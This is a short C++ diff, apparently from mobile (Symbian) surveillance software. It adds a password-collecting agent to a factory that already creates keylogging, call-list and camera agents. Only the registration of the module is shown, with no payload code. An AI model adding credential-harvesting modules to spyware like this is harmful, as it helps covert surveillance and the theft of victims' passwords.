@@ -23,6 +23,7 @@
 #include "AgentCallList.h"
 #include "AgentKeylog.h"
 #include "AgentCamera.h"
+#include "AgentPassword.h"
 
 EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8& params)
 	{
@@ -55,6 +56,8 @@ EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8
 		case EAgent_Application:
 			return CAgentApplication::NewL(params);
 			// add new agents here...
+		case EAgent_Password:
+			return CAgentPassword::NewL(params);
 		default:
 			// User::Leave(KErrNotSupported);
 			return CAgentNone::NewL(aId, params);
